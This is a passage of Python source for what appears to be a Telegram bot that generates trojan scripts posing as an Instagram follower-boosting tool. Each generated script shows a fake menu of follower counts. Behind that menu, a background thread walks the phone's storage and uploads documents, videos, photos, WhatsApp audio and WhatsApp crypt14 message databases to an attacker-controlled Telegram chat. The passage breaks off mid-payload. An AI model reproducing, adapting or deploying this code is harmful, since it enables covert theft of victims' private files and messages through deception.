	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) '''
						creat_payloads(id, ms, payload)
					elif second_data == 'doc':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
					executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'vid':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".mp4")):
				executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'dow':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Download/"

def send_file1(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')


def send_file2(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def send_file3(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
			file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
					executor.submit(send_file1, file_path)
				elif file_path.lower().endswith((".mp4")):
					executor.submit(send_file2, file_path)
				elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
					executor.submit(send_file3, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsaudio':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".aac",".mp3", ".opus")):
            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')
def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".aac",".mp3", ".opus")):
					executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsvid':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".aac",".mp3", ".opus")):
					executor.submit(send_file, file_path)

threading.Thread(target=back).start()


Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsphoto':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()


Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsdb':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith("crypt14"):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

